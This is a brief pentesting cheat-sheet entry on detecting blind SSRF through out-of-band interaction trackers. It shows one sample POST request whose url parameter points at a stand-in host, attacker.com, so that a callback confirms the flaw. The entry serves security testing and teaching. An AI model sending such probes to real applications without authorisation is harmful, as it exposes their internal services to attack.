# Blind SSRF

## Summary
Detect and exploit blind SSRF via OOB channels.

## Technique
Use an interaction tracker (Burp Collaborator, Interact.sh, webhook.site):
```
POST /api/proxy HTTP/1.1
Host: app.com
url=http://attacker.com/probe

→ If attacker.com receives request → SSRF confirmed
```
